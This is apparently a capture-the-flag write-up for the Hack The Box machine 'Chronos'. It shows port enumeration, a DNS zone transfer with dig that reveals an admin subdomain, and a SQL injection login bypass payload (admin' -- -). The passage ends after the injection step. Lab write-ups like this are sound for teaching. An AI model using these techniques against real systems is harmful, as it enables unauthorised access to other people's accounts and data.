# Chronos

IP: `10.10.10.13`

## Enum

- Ubuntu Apache/2.4.18 on port 80 with default page
- openssh 7.2p2 on port 22 username enumeration
- apache2ctl graceful privilege escalation
- 9.10.3-p4-ubuntu only has DOS vulnerabilities

We see that there is a dns for this which is called cronos.htb, so let's try to attack that instead.

Edit the `/etc/hosts` file to add `10.10.10.13     cronos.htb` inside.

Running a quick command for `dig` yields us with more dns

```sh
~/HTB/results/10.10.10.13 » dig axfr @10.10.10.13 cronos.htb                omar2535@kali

; <<>> DiG 9.16.4-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
```

and we add `admin.cronos.htb` to our `/etc/hosts` file.

Navigating to `admin.cronos.htb`, plugging in `admin' -- -` for the username and anything for the password will give a valid sql injection.